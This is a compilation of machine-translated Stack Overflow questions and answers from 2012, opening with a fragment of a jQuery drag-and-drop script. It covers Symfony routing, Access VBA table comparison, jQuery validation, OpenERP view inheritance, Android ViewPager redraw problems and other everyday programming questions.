        console.log('CHECKING : ' + $(this).text() + ' against ' + $(ui.draggable).text().trim());

        if ($(this).text() == $(ui.draggable).text().trim()) {

            $(this).addClass('wordglow3');
        } else {
            $(this).addClass('wordglow');
        }
        console.log('CHECKING : ' + $(this).text() + ' against ' + $(ui.draggable).text().trim());

        console.log(guesses);

        if (guesses[word].length == 3) {
            if (guesses[word].join('') == word) {
                $('td[data-word=' + word + ']').addClass('wordglow2');

            } else {
                $('td[data-word=' + word + ']').addClass("wordglow4");
                guesses[word].splice(0, guesses[word].length);
            }
        }

    },

    activate: function(event, ui) {
        word = $(this).data('word');

        // try to remove the class
        $('td[data-word=' + word + ']').removeClass('wordglow').removeClass('wordglow4').removeClass('wordglow3');
    }

});

$(".minibutton").hover(function (){
        $(this).css("text-decoration", "underline");
    },function(){
        $(this).css("text-decoration", "none");
    }
);

$(".minibutton2").hover(function (){
        $(this).css("text-decoration", "underline");
    },function(){
        $(this).css("text-decoration", "none");
    }
);

var audio = $("#mysoundclip")[0];
$("button").click(function() {
    var noExist = $('td[data-word=' + listOfWords[rndWord].name + ']').hasClass('wordglow2');
    if (noExist) {
        $('#pickNext').click();
    } else {

        $("#mysoundclip").attr('src', listOfWords[rndWord].audio);
        audio.play();
    }
});

var audio = $("#mysoundclip")[0];
$("button2").click(function() {
    var noExist = $('td[data-word=' +  listOfWords[rndWord].name + ']').hasClass('wordglow2');
    if (noExist) {
        $('#pickNext').click();
    } else {

        $("#mysoundclip").attr('src',  listOfWords[rndWord].audio);
        audio.play();
    }
});

var pic = $("#mypic")[0];
$("button").click(function() {
    var noExist = $('td[data-word=' +  listOfWords[rndWord].name + ']').hasClass('wordglow2');
    if (noExist) {
        $('#pickNext').click();
    } else {

        pic = $("#mypic").attr('src',  listOfWords[rndWord].pic);
        pic.show();
    }
});

function keys(obj) {
    var keys = [];
    for (var key in obj) {
        if (obj.hasOwnProperty(key)) {
            keys.push(key);
        }
    }
    return keys;
} 
```

​</p>

# symfony - symfony 无法导入路由

> ID：11736901
> 
> 赞同：0
> 
> 时间：2012-07-31T09:22:02.220
> 
> 标签：symfony

我正在使用 Jobeet 教程。

我在 app/confing 文件中配置了如下路由：

```
EnsJobeetBundle:
    resource: "@EnsJobeetBundle/Resources/config/routing.yml"
    prefix:   / 
```

在 EnsJobeetBundle 路由中定义如下：

```
EnsJobeetBundle_job:
    resource: "@EnsJobeetBundle/Resources/config/routing/job.yml"
    prefix: /job 
```

当我使用 URL 时`http://localhost/Symfony/web/app_dev.php/job/`，出现以下错误：

```
Cannot import resource "@EnsJobeetBundle/Resources/config/routing/job.yml" 
 from "C:\wamp\www\Symfony\src\Ens\JobeetBundle/Resources/config/routing.yml". 
Make sure the "EnsJobeetBundle/Resources/config/routing/job.yml" bundle 
 is correctly registered and loaded in the application kernel class. 
```

我还在 appkernel 文件中注册了如下：

```
new Ens\JobeetBundle\EnsJobeetBundle(), 
```

什么可能导致这些错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T13:49:56.143

就我而言，在尝试生产 url 时，我遇到了同样的错误。

在 app/AppKernel.php 中有一个条件只考虑“开发”和“测试”环境：

```
 if (in_array($this->getEnvironment(), array('dev', 'test'))) 
```

如果您的捆绑包也应该在 prod 环境中启用，您应该修改条件：

```
 if (in_array($this->getEnvironment(), array('prod', 'dev', 'test'))) 
```

这为我解决了错误。

# c# - 运行空间和自定义 powershell

> ID：11736905
> 
> 赞同：2
> 
> 时间：2012-07-31T09:22:04.593
> 
> 标签：c#, powershell, runspace

我正在尝试在 C# 中开发一些使用 PowerShell 的工具。但是，我必须使用与创建运行空间时默认使用的这个不同的 powershell，我的意思是这个：

```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe 
```

是否可以强制 Runspace 使用不同（自定义）版本的 powershell？

标准版powershell的问题并没有很多命令，比如“Open-Device”和“Close-Device”。

先感谢您

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T11:07:10.313

我认为您缺少 PSH 运行时和主机之间的区别。主机向`Write-Host`运行时提供服务（、脚本、...）。因此 ISE 不执行转录，因为它不实施该服务。

使用运行空间，您只需获得核心 PSH 运行时以及加载到其中的任何管理单元/模块。根据实施方式`Open-Device`和`Close-Device`实施方式，您可能会陷入困境。如果它们由管理单元或模块（您的自定义主机自动加载）实现，则只需加载必要的组件。如果这些 cmdlet 依赖于主机本身实现的某些东西，那么您需要考虑运行一个单独的进程。

（越来越多地不得不使用自定义主机应该被视为糟糕的形式，因为它不适用于作业、远程处理和（我怀疑）工作流。）

# javascript - Javascript调整所有图像的大小

> ID：11736908
> 
> 赞同：0
> 
> 时间：2012-07-31T09:22:12.980
> 
> 标签：javascript, image, resize

我试图调整页面上所有图像的大小。谷歌搜索 1 天后，我以以下代码结束：

```
<script type="text/javascript">
<!--
window.onresize = function(){
var images = document.images;
images.style.width = "100%";
};

-->
</script> 
```

有人可以告诉我，为什么这行不通？：/

问候SG

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:27:22.433

两点你为什么不使用css，我不确定你为什么需要使用javascript。

```
img{width:100%;} 
```

第二在您的示例中，您的代码被注释掉了，并且图像创建了一个数组，您需要循环遍历 seeZoltan Toth 答案

# css - Codeigniter CSS 和 Javascript 文件的使用

> ID：11736909
> 
> 赞同：1
> 
> 时间：2012-07-31T09:22:14.137
> 
> 标签：css, codeigniter

我正在用 CI 写一个网页。我使用的是最新版本。我需要学习如何暗示 CSS 和 Javascript 文件。我使用 nivoslider 、 jquery 和许多 css 文件。我使用应用程序目录作为

```
+application
  +views
    +pages
     -home.php
    +templates
     -header.php
     -footer.php
+system
+user_guide. 
```

你能解释一下如何启用 js 和 Css 文件吗？我进行了一项研究，但我的思绪被 codeigniter 的版本所震撼。这是我的 header.php

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN
     ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>Kırmızı Eğitim Merkezi</title>
        <meta name="description" content="Empire - XHTML Template" />
    <!-- CSS -->
    <link href='./fonts/sansation.css' rel="stylesheet" type="text/css" />
    <!-- Get any font from here easily: http://www.google.com/webfonts -->
    <link href="./css/style.css" rel="stylesheet" type="text/css" />
    <link href="./fancybox/jquery.fancybox-1.3.4.css" rel="stylesheet" 
          type="text/css" />
    <link href="./css/nivo-slider.css" rel="stylesheet" type="text/css" />

    <!-- UPDATE BROWSER WARNING IF IE 7 OR LOWER -->
    <!--[if lt IE 8]><link href="css/stop_ie.css" rel="stylesheet" 
         type="text/css" /><![endif]--><!-- JAVASCRIPTS -->
    <script type="text/javascript" src="./js/jquery.min.js">
    </script><script type="text/javascript" 
         src="./js/jquery-ui-1.8.17.custom.min.js">
    </script><script type="text/javascript" 
         src="./fancybox/jquery.fancybox-1.3.4.pack.js">
    </script><script type="text/javascript" src="./js/jquery.nivo.slider.js">
    </script><script type="text/javascript" src="./js/jquery.bgslider.js">
    </script><script type="text/javascript" src="./js/preloader.js">
    </script><script type="text/javascript" src="./js/farbtastic.js">
    </script><script type="text/javascript" src="./js/basic.js">

    </script> 
```

你能给我一个使用它们的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:27:43.183

首先，您需要将 JS 和 CSS 文件放置在以下位置：

```
+ assets
   + js
   + css 
```

然后你需要给他们打电话：

```
<link href='<?php echo base_url(); ?>assets/css/cssfile.css' rel="stylesheet" type="text/css" />
<script type="text/javascript" src="<?php echo base_url(); ?>assets/js/jquery.min.js"> 
```

# lua - 如何使用 string.gsub 替换 Lua 中的括号？

> ID：11736913
> 
> 赞同：1
> 
> 时间：2012-07-31T09:22:26.543
> 
> 标签：lua, string-substitution, lua-patterns

我有一个函数，用于用几个字符或数字替换一些单词。我`string.gsub()`以这种方式使用函数：

```
string.gsub(line, "[0-9%a%s/,-]+", "\t") 
```

这对带有数字、字母、空格、`,`和的字符串非常有效`/`。我也想替换括号，比如`(`and `)`。但简单地插入`()`我的模式是行不通的。我也尝试过`%(`，`%)`但没有成功。如何使用`string.gsub()`方法中的模式替换 Lua 中的括号？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T11:29:18.773

唯一需要在里面转义的字符`[]`是`[]%-`, 所有这些都用`%`. 因此，转义`-`如下工作：

```
string.gsub(line, "[0-9%a%s/,%-()]+", "\t") 
```

还可能值得一提的`[0-9%a]`是 相当于`[%d%a]`，相当于`%w`。

# javascript - 单击 Firefox 工具栏按钮中的坐标

> ID：11736914
> 
> 赞同：0
> 
> 时间：2012-07-31T09:22:28.960
> 
> 标签：javascript, firefox-addon, xul

我想从我的 Firefox 扩展中的工具栏图标获取点击坐标。

我正在使用的代码如下： `//Toolbar code`

```
<?xml version="1.0"?>                 
<overlay id="myext-toolbar-Overlay"
xmlns="http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul">

<?xml-stylesheet href="chrome://myext/skin/myextToolbarButton.css" type="text/css"?>

<script src="chrome://myext/content/myextExtension.js" type="application/x-javascript" />

<toolbarpalette id="BrowserToolbarPalette">
    <toolbarbutton id="myext-button" class="toolbarbutton-1"
      label="Button"
      tooltiptext="Clip Web Page"
      oncommand="myextExtension.showPopup(event);" >
    </toolbarbutton>
</toolbarpalette>

</overlay> 
```

单击工具栏图标时，将显示一个弹出窗口。我想在单击工具栏图标的位置显示弹出窗口。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T10:16:51.970

该`command`事件不是鼠标事件，它可以通过不同的方式触发（鼠标和键盘是最常见的），因此您无法在此处获取鼠标位置。您可以为事件定义一个处理程序`click`，记住`event.screenX`/`event.screenY`并在您的`command`事件处理程序中使用它们，然后如果它们可用。但是最好为按钮添加一个[`popup`属性](https://developer.mozilla.org/en/XUL/Attribute/popup)并让系统处理它。或者只是使用[`<toolbarbutton type="menu">`](https://developer.mozilla.org/en/XUL/toolbarbutton#a-toolbarbutton.type).

# vba - 是否可以使用 VBA 在不同的 Access 文件中“同步”两个表？

> ID：11736916
> 
> 赞同：1
> 
> 时间：2012-07-31T09:22:35.700
> 
> 标签：vba, ms-access

我创建了一个 Access 数据库，我想将它分发给一个小组。虽然我总是可以在 excel 中导出表格并在那里合并/追加数据，但有没有办法同步数据库，也许是使用 VBA？

进一步说明，在数据库应用程序中的一种形式中，可能存在同步按钮，并且单击时，可能会打开一个对话框以查找要与之同步的accdb。随之而来的是 VBA 将在两个 accdbs 之间“同步”有问题的表（当然具有相同的结构）。

这可能吗？洞察力会很好。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T09:46:48.937

是的，这是完全可能的。以下是有关比较两个数据库和记录更改的一些说明。

该过程需要模块顶部的以下内容：

```
Dim strFileNew As String 
Dim strFileOld As String 
Dim strLog As String
Dim dbOld As Database 
```

变量可能包含：

```
strLog = "log.txt"
strFileNew = "z:\docs\dbNew.mdb"
strFileOld = "z:\docs\dbOld.mdb"
Set dbOld = OpenDatabase(strFileOld) 
```

然后对比：

```
Sub LogCompareDB(db As Database)
''References : Windows Script Host Object Model
''           This is set by default for a number of versions
''           : Microsoft DAO x.x Object Library
''           For 2010, the DAO library is called 
''           :Microsoft Office 12.0 Access Database Engine Object Library

Dim tdf As TableDef
Dim rs0 As DAO.Recordset
Dim rs1 As DAO.Recordset
Dim fld As DAO.Field
Dim idx As Index
Dim idxPrimary  As Index
Dim strIndexList As String
Dim strIndex As String
Dim strID As String
Dim strSQL As String
Dim strChanged As String
Dim blnNew As Boolean
Dim fs As New FileSystemObject
Dim ts As TextStream

    Set ts = fs.CreateTextFile(strLog, True)

    ''For each table in the old database
    ''(It would probably be a good idea to check the
    ''new database for added tables)
    For Each tdf In db.TableDefs
        '' Skip system tables
        If Left(tdf.Name, 4) <> "MSys" Then
            strIndex = vbNullString
            Set idxPrimary = Nothing
            strIndexList = vbNullString

            ''Get the primary index and index fields
            For Each idx In tdf.Indexes
                If idx.Primary = True Then
                    Set idxPrimary = idx
                    For Each fld In idx.Fields
                        strIndex = strIndex & " AND t0.[" & fld.Name _
                            & "] = t1.[" & fld.Name & "]"
                        strIndexList = strIndexList & "," & fld.Name
                    Next
                    strIndex = Mid(strIndex, 5)
                End If
            Next

            ''There is no basis for comparison if there is no index.
            ''A unique index would also be a possibility, but hey, let's
            ''not go over the top :)
            If strIndex > vbNullString Then

                ''Select all records from the table for both databases
                strSQL = "SELECT * FROM [;DATABASE=" & strFileNew & "].[" _
                    & tdf.Name & "] As t0 LEFT JOIN [" _
                    & tdf.Name & "] As t1 ON " & strIndex

                Set rs0 = db.OpenRecordset(strSQL)

                ''A convenient list of fields from the old database
                ''It would probably be a good idea to check the
                ''new database for added fields.

                strSQL = "SELECT * FROM [;DATABASE=" & strFileOld & "].[" _
                    & tdf.Name & "] As t0 WHERE 1=2"

                Set rs1 = db.OpenRecordset(strSQL)

                Do While Not rs0.EOF
                    strID = vbNullString
                    blnNew = False

                    ''If the index fields are null, then it is a new record
                    For Each fld In idxPrimary.Fields
                        strID = strID & fld.Name & ": " & rs0("[t0." & fld.Name & "]") & vbCrLf

                        If IsNull(rs0("[t1." & fld.Name & "]")) Then
                            blnNew = True
                        End If
                    Next

                    If blnNew Then
                        ''Write to log
                        ts.WriteLine "NEW RECORD " & strID & vbCrLf
                    Else
                        ''Not a new record, so is it a changed record?
                        strChanged = vbNullString

                        For Each fld In rs1.Fields
                            ''No need to check index fields, because they are equal
                            If InStr(strIndexList, fld.Name) = 0 Then

                                ''Add null string for purposes of comparison                                 ''trailing
                                If "" & rs0("[t0." & fld.Name & "]") <> "" & rs0("[t1." & fld.Name & "]") Then
                                    strChanged = strChanged & vbCrLf _
                                        & fld.Name & "  Is: " & Trim(rs0("[t0." & fld.Name & "]")) _
                                        & "  Was: " & Trim(rs0("[t1." & fld.Name & "]"))
                                End If
                            End If
                        Next

                        If strChanged <> vbNullString Then
                            ''Write to log
                            ts.WriteLine "CHANGED RECORD " & strID
                            ts.WriteLine strChanged & vbCrLf
                        End If
                    End If

                    rs0.MoveNext
                Loop
            Else
                ts.WriteLine "NO PRIMARY INDEX " & tdf.Name & vbCrLf
            End If
        End If
    Next

   ts.Close
   FollowHyperlink strLog
End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-24T11:35:31.410

```
Option Compare Database

Private Sub Command4_Click()

Dim tablename1, tablename2 As String
tablename1 = Text0.Value
tablename2 = Text2.Value

'On Error GoTo Err_cmdValidateGeneralInfo_Click
Dim F As DAO.Field
Dim rs As DAO.Recordset
Dim rs1 As DAO.Recordset
Set curDB = CurrentDb()
'If Me.DateModified = Date Then
    'Adds new employees to the TT_GeneralInfo table in the FTEI_PhoneBook.mdb -    which     is used thru out the AP databases.
 '   DoCmd.OpenQuery "qryEmpData_TT_General"

strsql = "Select * from " & tablename1

Set rs = curDB.OpenRecordset(strsql)

strsql1 = "Select * from " & tablename2

   DoCmd.CopyObject , "Unmatched_records", acTable, tablename1
   curDB.Execute "DELETE FROM Unmatched_records"

Set rs1 = curDB.OpenRecordset(strsql1)
    Do Until rs.EOF
      For Each F In rs.Fields
        If rs.Fields(F.Name) <> rs1.Fields(F.Name) Then
          'rs.Edit
          strsql = "Select * into test from " & tablename1 & " where " & F.Name & "   = """ & rs.Fields(F.Name) & """"
          DoCmd.RunSQL strsql

          If DCount(F.Name, "test") <> 0 Then
          GoTo append_unmatch

          'appending unmacthed records
append_unmatch:

          strsql2 = "insert into Unmatched_records Select * from test"
          DoCmd.RunSQL strsql2

          'if record doesnt match move to next one
          GoTo Nextrecord
          End If
         ' rs.Fields(F.Name) = rs1.Fields(F.Name)
         ' rs.Update
        End If
      Next F

Nextrecord:
rs.MoveNext
rs1.MoveNext
    Loop

    If DCount("test", F.Name) <> 0 Then
    MsgBox ("The two tables didnt match. Check table test for unmatching reocrds.")
    Else
    MsgBox ("Tables match!")
    End If

End Sub 
```

# jquery - 针对 json / 数组的 jQuery 文本字段验证

> ID：11736923
> 
> 赞同：2
> 
> 时间：2012-07-31T09:23:07.427
> 
> 标签：jquery, json, validation

我正在寻找一种解决方案来针对由 json 文件提供的数组验证文本字段的输入。例如：在注册表中检查所需的用户名是否已经存在。

任何人都可以提供工作示例、插件、脚本或教程吗？

'usernames.json' 看起来像这样......

```
{"usernames":["carl","jack","jill"]} 
```

...并与...一起读出

```
$.getJSON("usernames.json", function(names) {
var invalidName = names; 
```

我会继续...

```
jQuery.validator.addMethod 
```

...但从这里开始，我被困住了。

如果有人可以帮助提供一个工作示例，我将非常高兴！

///////////////////////////////////////// //

编辑：感谢 Utkanos 和 Pavel Staseljun，我可以找出以下解决方案，该解决方案仅经过粗略测试！还请在下面找到 Utkanos 的示例，因为该示例包括“keyup”处理而不是“提交”，并且不包括“必需”检查。“#errorresponse”是 div，其中可能会显示错误消息。

```
$.ajax({
  url: "http://yoururlto.json?callback=?",
  dataType:"jsonp",
  jsonpCallback: '?',
  async: false,
  success: function(json) {
        $('#user').keyup(function(evt) {
        var jsonarray = json.usernames;
        var userinput = $('#user').val().toLowerCase()
        var check = $.inArray(userinput, jsonarray);
        if (check !== -1) {
            $("#errorresponse").text('Thanks to Utkanos and Pavel Staseljun!');
            }
        })
      }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:31:43.010

HTML

```
<form id='signup'>
    <label>Choose a username</label>
    <input type='text' id='user' />
    <input type='submit' value='submit' />
</form> 
```

JS/jQuery

```
$.getJSON("usernames.json", function(json) {
    $('#signup').on('submit', function(evt) {
        var user = $('#user').val(), error;
        if (!user)
            error = 'no username entered';
        else if (json.usernames.indexOf(user) != -1)
            error = 'username already taken';
        if (error) { evt.preventDefault(); alert(error); }
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:33:32.517

为什么要将所有用户名从服务器发送到客户端？这听起来是个很糟糕的主意。请执行类似服务器端功能的操作，该功能检查发布的用户名并返回真或假以表示有效或无效？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:33:42.477

你不能创建一个ajax脚本来检查用户名是否存在

更好的 imo，因为您可以使用远程选项直接将其与 jquery 验证器集成。

# wxpython - Validator 和 PyValidator 的区别

> ID：11736933
> 
> 赞同：0
> 
> 时间：2012-07-31T09:23:29.317
> 
> 标签：wxpython

`wx.Validator`和有什么不同 `wx.PyValidator`？以及如何使用它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T13:58:48.580

PyValidator 是 wx.Validator 的子类。根据[文档](http://wxpython.org/docs/api/wx.PyValidator-class.html)，PyValidator 是 wx.Validator 的代理，所以我认为本身并没有真正的区别。但是，大多数示例使用 Py 版本。wxPython 网站上有一个关于此主题的[wiki 页面，您应该阅读。](http://wiki.wxpython.org/Validator%20for%20Object%20Attributes)[您还可以在新的 Phoenix文档](http://wxpython.org/Phoenix/docs/html/validator_overview.html#validator-overview)中阅读它们或查看 wxPython 演示包中的示例。

# c# - 无法测试 Button.click 事件是否为空

> ID：11736937
> 
> 赞同：0
> 
> 时间：2012-07-31T09:23:42.030
> 
> 标签：c#, outlook, add-in

我需要测试我的`button.Click`事件是否为空。这是 c# 中的事件：

```
button.Click += new Office._CommandBarButtonEvents_ClickEventHandler(Lancement_Formualire_Event); 
```

我用

```
(button.Click == null) 
```

但编译器拒绝这样做。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T09:24:51.373

> 我用 (bouton.Click == null) 进行了测试，但编译器拒绝这样做。

的确。这是事件抽象所不允许的。一个事件允许你做的就是订阅它，或者取消订阅它。你不应该关心其他订阅者。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:27:35.213

如果你用一个空的“包装器”扩展类，你可能会完成你需要的事情`Button`，它反过来会实现自己的`Click`事件并将其中继到`Button.Click`.

不同之处在于，您的自定义“包装器”将拥有`event`可以随意检查的对象。

它类似于实现 INotifyPropertyChanged 时通常执行的操作，应该可以满足您的需求。

# javascript - 不明白为什么要使用 JavaScript void 函数

> ID：11736941
> 
> 赞同：0
> 
> 时间：2012-07-31T09:24:00.000
> 
> 标签：javascript

> **可能重复：**
> [javascript中的无效点是什么](https://stackoverflow.com/questions/666936/what-is-the-point-of-void-in-javascript)

在很多地方我都见过*Javascript Void*，但我仍然无法理解为什么要使用这个。我能够进行复杂的 javascript 编码，但不清楚这个特定的功能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:31:28.707

void 是用于返回空值的运算符，因此浏览器将无法加载新页面。

//解释代码

```
<a href="JavaScript:void(0);" ondblclick="alert('Well done!')">Double Click Me!</a> 
```

在上面的例子中，单击一下不会发生任何事情，但是如果你双击它会发出警报，做得好！（void(0) 用于阻止页面加载）

# openerp - 通过自定义模块覆盖默认视图？

> ID：11736944
> 
> 赞同：5
> 
> 时间：2012-07-31T09:24:08.350
> 
> 标签：openerp

有没有办法覆盖 openerp 的默认视图，开发一个模块而不是从设置/自定义/用户界面/视图手动执行...？

我们正在使用 OpenERP 并自定义了许多默认视图（项目列表、发票列表、发票搜索等），从列表和搜索过滤器/组中添加和隐藏字段，我们正在从 Web 客户端逐个视图手动查看。有没有办法开发一个模块，我可以为我想要自定义的所有视图编写 xml，并且当我安装该模块时，所有视图（以及窗口操作）都会更新？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T09:53:14.597

您可以使用[视图继承](http://doc.openerp.com/v6.1/developer/03_modules_3.html#inheritance-in-views)来自定义使用 XML 文件的任何视图。

使用继承，您可以向任何视图添加、删除和替换元素。您还可以定义新的完整视图来替换默认视图而不是继承。只需使用自定义或替换当前视图的 XML 文件创建一个新模块并加载该模块。模块文件夹应该只包含`__init__.py`,`__openerp__.py`和 XML 文件。

`EAN13`这是一个从产品视图中删除字段的简单示例。

* * *

**`__init__.py`**空的文件

* * *

**`__openerp__.py`**：

```
{
    "name" : "View Customization Test",
    "version" : "1.0",
    "category" : "Generic Modules/Inventory Control",
    'depends' : ['product',],
    "update_xml" : ["product.xml",],
    "installable": True,
    "active": True
} 
```

* * *

**`product.xml`**：

```
<?xml version="1.0" encoding="utf-8"?>
<openerp>
  <data>
    <record model="ir.ui.view" id="view_product_form_custom">
      <field name="name">product.form.inherit2</field>
      <field name="model">product.product</field>
      <field name="inherit_id" ref="product.product_normal_form_view" />
      <field name="arch" type="xml">
        <field name="ean13" position="replace" />
      </field>
    </record>
  </data>
</openerp> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:47:16.333

当然有。您可以创建自定义模块并安装它。[请参阅官方文档](http://doc.openerp.com/v6.1/developer/03_modules_1.html)中的基础知识。[技术纪念品](http://doc.openerp.com/memento/OpenERP_Technical_Memento_v0.6.4_A4.pdf)也是您手头应该有的东西。

这使得在开发环境中进行开发和测试，然后在生产环境中复制和安装变得更加容易。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T13:24:44.210

当然有可能（这样做是个好主意。）首先阅读[视图和视图继承的基础知识](http://doc.openerp.com/v6.1/developer/03_modules_3.html#inheritance-in-views)

*   then simply create a folder under your addons
*   add a `__init__.py` [[python module descriptor](http://doc.openerp.com/v6.1/developer/03_modules_1.html#python-module-descriptor-file-init-py)]
*   Add `__openerp__.py` [[OpenERP Module Descriptor](http://doc.openerp.com/v6.1/developer/03_modules_1.html#openerp-module-descriptor-file-openerp-py)]
*   Create an xml file and inheirt the required view with the XML Identifier of the existing view and register your view.xml in `__openerp__.py`. And update your databse with your new module.

# android - onSaveInstanceState() 在活动和片段中？

> ID：11736946
> 
> 赞同：0
> 
> 时间：2012-07-31T09:24:14.323
> 
> 标签：android

我有一个包含 2 个片段的活动。我想保存活动和片段的某些状态，以便在活动或片段被破坏时恢复。

所以我在片段和活动中都使用了 onSaveInstanceState，并将包的数据传递给 onCreate 或 onCreateView。

此外，当活动被破坏时，这也很有效。然后在恢复它自己的数据，但是，因为在 onCreate() 我再次实例化适配器和片段，它们没有状态。

我该如何解决这个问题？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:33:24.867

最有可能的原因是`Fragment`'根据生命周期文档在'`onCreateView()`之前运行：`Activity``onResume()``Fragment`

[http://developer.android.com/guide/components/fragments.html#Creating](http://developer.android.com/guide/components/fragments.html#Creating)

# vim - Ubuntu 12.04 中的 Solarized 主题 + Yakuake + VIM

> ID：11736948
> 
> 赞同：0
> 
> 时间：2012-07-31T09:24:15.513
> 
> 标签：vim, konsole

我已经搜索过有关 Yakuake/Konsole 和 Solarized 主题的答案，但所有讨论似乎都以 gnome-terminal 为中心。

如题，

### `~/.vimrc~`

```
" sets colorscheme
set t_Co=16
set background=dark
let g:solarized_termcolors=16
let g:solarized_termtrans = 1
colorscheme solarized 
```

### `~/.kde/share/apps/konsole/`

```
-rw-rw-r-- 1 fradeve fradeve 1040 Jul 31 10:57 SolarizedDark.colorscheme 
```

来自 github.com/eternicode/konsole-colors-solarized （抱歉，由于缺乏声誉，我不能发布两个以上的链接）。

### 而且

*   在 Yakuake 配置中正确设置 SolarizedDark 颜色方案
*   Yakuake已重新启动以刷新设置
*   vim 运行简单，不在 tmux 中
*   注释掉`let g:solarized_termcolors=16`并不能解决问题

并且结果与显示的颜色主题略有不同。我将以 JavaScript 为例：

原创主题： [原创日晒](http://ethanschoonover.com/solarized/img/screen-javascript-dark.png)

我的日晒控制台 [我的日晒](http://i.imgur.com/WZwPf.png)

在我看来，使用这种“扭曲”的颜色是在浪费作者的才华。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T14:13:27.873

这个问题解决了设置为 .vimrc ： **让 g:solarized_termcolors=256** 看到 - [https://github.com/altercation/vim-colors-solarized#important-note-for-terminal-users](https://github.com/altercation/vim-colors-solarized#important-note-for-terminal-users)

# android - ViewPager 不重绘内容，保持/变为空白

> ID：11736953
> 
> 赞同：90
> 
> 时间：2012-07-31T09:24:32.107
> 
> 标签：android, android-viewpager

我们在这里遇到了一个非常奇怪的 ViewPager 问题。我们在每个 ViewPager 页面上嵌入列表，并在更新列表数据时在列表适配器和视图分页适配器上触发 notifyDataSetChanged。

我们观察到，有时页面不会更新其视图树，即保持空白，有时甚至在分页时消失。当来回翻页几次时，内容会突然重新出现。似乎 Android 在这里缺少视图更新。我还注意到，在使用层次结构查看器进行调试时，选择一个视图总是会使其重新出现，显然是因为层次结构查看器会强制所选视图重绘自身。

不过，我无法以编程方式完成这项工作；使列表视图无效，甚至整个视图寻呼机无效。

这与兼容性-v4_r7 库有关。我也尝试使用最新版本，因为它声称修复了许多与视图寻呼机相关的问题，但它使事情变得更糟（例如，手势被破坏，因此有时它不会让我再翻阅所有页面。）

是否还有其他人也遇到这些问题，或者您是否知道可能导致此问题的原因？

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2015-11-24T08:25:23.620

如果`ViewPager`设置在带有 的 Fragment 中`FragmentPagerAdapter`，请使用`getChildFragmentManager()`而不是`getSupportFragmentManager()`作为参数来初始化您的`FragmentPagerAdapter`.

```
mAdapter = new MyFragmentPagerAdapter(getChildFragmentManager()); 
```

代替

```
mAdapter = new MyFragmentPagerAdapter(getSupportFragmentManager()); 
```

* * *

## 回答 #2

> 赞同：46
> 
> 时间：2012-08-23T11:14:25.890

我们终于设法找到了解决方案。显然我们的实现遇到了两个问题：

1.  我们的适配器没有删除`destroyItem()`.
2.  我们正在缓存视图，因此我们只需要对我们的布局进行一次膨胀，而且，由于我们没有删除 中的视图`destroyItem()`，因此我们没有添加它，`instantiateItem()`而只是返回与当前位置相对应的缓存视图。

我对源代码的研究并没有太深入`ViewPager`- 而且你必须这样做并不完全明确 - 但文档说：

> **destroyItem()**
> 删除给定位置的页面。适配器负责从其容器中删除视图，尽管它只必须确保在从 finishUpdate(ViewGroup) 返回时完成此操作。

和：

> 一个非常简单的 PagerAdapter 可以选择使用页面 View 本身作为关键对象，在创建后从 instantiateItem(ViewGroup, int) 返回它们并将它们添加到父 ViewGroup 中。匹配的 destroyItem(ViewGroup, int, Object) 实现将从父 ViewGroup 中删除 View，并且 isViewFromObject(View, Object) 可以实现为 return view == object;。

所以我的结论是，它`ViewPager`依赖于它的底层适配器在 / 中显式地添加/删除它的`instantiateItem()`孩子`destroyItem()`。也就是说，如果您的适配器是 的子类`PagerAdapter`，则您的子类必须实现此逻辑。

旁注：如果您在内部使用列表，请注意[这一点](https://stackoverflow.com/questions/7290841/java-lang-illegalargumentexception-the-observer-is-null)`ViewPager`。

* * *

## 回答 #3

> 赞同：23
> 
> 时间：2012-10-24T08:01:41.647

我遇到了完全相同的问题，但实际上我破坏了 destroyItem 中的视图（我想）。然而问题是我使用`viewPager.removeViewAt(index);`insted of销毁了它`viewPager.removeView((View) object);`

错误的：

```
@Override
public void destroyItem(ViewGroup viewPager, int position, Object object) {
    viewPager.removeViewAt(position);
} 
```

对：

```
@Override
public void destroyItem(ViewGroup viewPager, int position, Object object) {
    viewPager.removeView((View) object);
} 
```

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2012-07-31T09:31:35.723

ViewPager 试图围绕重复使用项目做一些聪明的事情，但它要求您在事情发生变化时返回新的项目位置。尝试将此添加到您的 PagerAdapter：

```
public int getItemPosition (Object object) { return POSITION_NONE; } 
```

它基本上告诉 ViewPager 一切都发生了变化（并迫使它重新实例化一切）。这是我唯一能想到的事情。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2019-01-06T18:23:21.400

尝试了太多解决方案但意外`viewPager.post()`奏效

```
 mAdapter = new NewsVPAdapter(getContext(), articles);
    viewPager.post(new Runnable() {
        @Override
        public void run() {
            viewPager.setAdapter(mAdapter);
        }
